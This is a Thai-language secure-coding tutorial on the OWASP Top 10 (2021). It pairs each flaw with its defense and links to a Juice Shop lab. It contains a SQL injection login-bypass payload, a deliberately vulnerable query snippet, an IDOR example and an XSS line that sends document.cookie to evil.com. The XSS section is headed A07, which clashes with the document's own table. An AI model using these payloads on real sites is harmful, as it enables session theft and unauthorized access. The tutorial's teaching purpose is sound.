---
title: "Level 1 — Application Security (OWASP Top 10)"
description: "ช่องโหว่เว็บที่เจอบ่อยที่สุด 10 อันดับตาม OWASP + วิธี secure coding ป้องกัน"
---

ช่องโหว่ที่ถูกโจมตีมากที่สุดในโลกจริงอยู่ที่ระดับ **แอปพลิเคชัน** ไม่ใช่ระดับ network
Level นี้เรียน **OWASP Top 10** — มาตรฐานที่ทุกคนในวงการ security อ้างอิง

:::note[OWASP คืออะไร]
Open Worldwide Application Security Project — องค์กรไม่แสวงกำไรที่รวบรวมความรู้ security ให้ใช้ฟรี OWASP Top 10 คือลิสต์ช่องโหว่เว็บที่อันตราย/เจอบ่อยที่สุด อัปเดตทุกไม่กี่ปี (ฉบับล่าสุด 2021)
:::

---

## OWASP Top 10 (2021) — ภาพรวม

| # | ช่องโหว่ | สรุปสั้นๆ |
|---|---|---|
| A01 | **Broken Access Control** | ผู้ใช้ทำสิ่งที่ไม่ควรมีสิทธิ์ทำได้ |
| A02 | **Cryptographic Failures** | เก็บ/ส่งข้อมูลสำคัญโดยไม่เข้ารหัส (หรือเข้ารหัสอ่อน) |
| A03 | **Injection** | ยัด input อันตรายให้ระบบรัน (SQL, command, …) |
| A04 | **Insecure Design** | ออกแบบระบบผิดตั้งแต่ต้น ไม่คิดเรื่อง security |
| A05 | **Security Misconfiguration** | ตั้งค่าผิด/ default ไม่ปลอดภัย |
| A06 | **Vulnerable Components** | ใช้ library/dependency ที่มีช่องโหว่ |
| A07 | **Auth Failures** | ระบบ login/session อ่อนแอ |
| A08 | **Data Integrity Failures** | เชื่อข้อมูล/อัปเดตจากแหล่งที่ไม่ verify |
| A09 | **Logging & Monitoring Failures** | ไม่มี log ทำให้ตรวจจับการโจมตีไม่ได้ |
| A10 | **SSRF** | หลอกให้ server ยิง request ไปที่ที่ไม่ควร |

ด้านล่างเจาะ 5 ตัวที่เจอบ่อยและสำคัญสุดสำหรับคนเริ่มต้น

---

## A03 — Injection (SQL Injection)

เกิดเมื่อแอปเอา **input ของผู้ใช้ไปต่อกับคำสั่งตรงๆ** โดยไม่แยกส่วน

**❌ โค้ดที่มีช่องโหว่:**
```python
query = "SELECT * FROM users WHERE email = '" + email + "'"
```
ถ้า `email` = `' OR 1=1--` query จะกลายเป็น `... WHERE email='' OR 1=1--'` → เงื่อนไขจริงเสมอ login ผ่านโดยไม่รู้รหัส

**✅ วิธีป้องกัน — Parameterized Query (Prepared Statement):**
```python
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```
database จะมองว่า `email` เป็น "ข้อมูล" ไม่ใช่ "คำสั่ง" — ยิงยังไงก็ไม่ทะลุ

:::tip[กฎทอง]
**อย่าเอา input มาต่อ string เป็นคำสั่งเด็ดขาด** — ใช้ parameterized query เสมอ หลักการนี้ใช้กับ SQL, NoSQL, OS command เหมือนกันหมด
:::

---

## A07 — Cross-Site Scripting (XSS)

จริงๆ XSS เป็น injection ประเภทหนึ่ง — ยัด **JavaScript** เข้าไปให้รันในเบราว์เซอร์เหยื่อ

**สถานการณ์:** เว็บบอร์ดที่แสดงคอมเมนต์โดยไม่กรอง ผู้โจมตีโพสต์:
```html
<script>fetch('https://evil.com?c='+document.cookie)</script>
```
พอเหยื่อเปิดหน้านั้น script รัน → ขโมย cookie/session ได้

**✅ ป้องกัน:**
- **Output encoding** — แปลง `<` เป็น `&lt;` ก่อนแสดงผล (framework สมัยใหม่ทำให้อัตโนมัติ เช่น React)
- **Content Security Policy (CSP)** — header จำกัดว่า script รันจากไหนได้บ้าง
- อย่าใช้ `innerHTML` / `dangerouslySetInnerHTML` กับ input ผู้ใช้

---

## A01 — Broken Access Control

ผู้ใช้เข้าถึง/แก้ไขสิ่งที่ไม่ควรมีสิทธิ์ — ช่องโหว่อันดับ **1** ปี 2021

**ตัวอย่างคลาสสิก — IDOR (Insecure Direct Object Reference):**
```
GET /api/orders/1001   ← order ของเรา
GET /api/orders/1002   ← ลองเปลี่ยนเลข → เห็น order คนอื่น!
```

**✅ ป้องกัน:**
- ตรวจสิทธิ์ **ทุก request** ที่ฝั่ง server (อย่าเชื่อว่า UI ซ่อนปุ่มไว้แล้วปลอดภัย)
- Default = **deny** แล้วค่อยเปิดสิทธิ์เฉพาะที่จำเป็น (least privilege)
- ผูก resource กับเจ้าของ: "order นี้เป็นของ user ที่ login อยู่จริงไหม?"

---

## A02 — Cryptographic Failures

ข้อมูลสำคัญ (รหัสผ่าน, บัตรเครดิต, ข้อมูลส่วนตัว) ถูกเก็บ/ส่งแบบไม่ปลอดภัย

**✅ ทำให้ถูก:**
- **รหัสผ่าน** — ห้ามเก็บ plaintext, ห้าม MD5/SHA1 → ใช้ **bcrypt / argon2** (hash + salt)
- **ส่งข้อมูล** — บังคับ **HTTPS (TLS)** เสมอ
- **ข้อมูลอ่อนไหวใน DB** — เข้ารหัส at rest
- อย่าคิดอัลกอริทึมเข้ารหัสเอง — ใช้ของมาตรฐานที่ผ่านการตรวจสอบ

---

## A05 — Security Misconfiguration

การตั้งค่าผิดพลาด — เจอบ่อยเพราะ "ลืม" มากกว่าเขียนโค้ดผิด

- เปิด debug mode / error message ละเอียดบน production (บอก stack trace ให้ attacker)
- ใช้ default password (admin/admin)
- เปิด port/service ที่ไม่ใช้
- ไม่ตั้ง security header (`X-Frame-Options`, `CSP`, `HSTS`)

**✅ ป้องกัน:** hardening + ตั้งค่าให้ปลอดภัยเป็น default + ตรวจด้วยเครื่องมืออัตโนมัติ (โยงไปที่ [DevSecOps](/devsecops/concepts))

---

## Authentication & Session — ทำให้ถูก

- **Password** — hash ด้วย bcrypt/argon2, บังคับความยาวขั้นต่ำ, เช็คกับ list รหัสที่รั่วบ่อย
- **MFA** — เปิด multi-factor ลดความเสี่ยงมหาศาลแม้รหัสรั่ว
- **Session/JWT** — ตั้งวันหมดอายุ, `HttpOnly` + `Secure` cookie, invalidate ตอน logout
- **Rate limiting** — จำกัดจำนวนครั้ง login กัน brute-force

---

## Secure Coding — หลักที่ใช้ได้ทุกภาษา

```
1. Validate input      → รับเฉพาะที่คาดหวัง (allowlist ดีกว่า blocklist)
2. Encode output       → กัน XSS
3. Parameterize query  → กัน injection
4. Least privilege     → account/service มีสิทธิ์เท่าที่จำเป็น
5. Fail securely       → error แล้ว default = deny, อย่าโชว์ข้อมูลระบบ
6. อย่า reinvent crypto → ใช้ library มาตรฐาน
```

---

## สรุป

| ช่องโหว่ | วิธีกันหลัก |
|---|---|
| SQL Injection | Parameterized query |
| XSS | Output encoding + CSP |
| Broken Access Control | ตรวจสิทธิ์ทุก request ฝั่ง server |
| Crypto Failures | bcrypt/argon2 + HTTPS |
| Misconfiguration | hardening + default ปลอดภัย |

พร้อมลงมือ → ไปเจาะช่องโหว่พวกนี้จริงๆ ที่ [Lab 01 — เจาะ OWASP Top 10 บน Juice Shop](/security/appsec/lab-01) 🧪
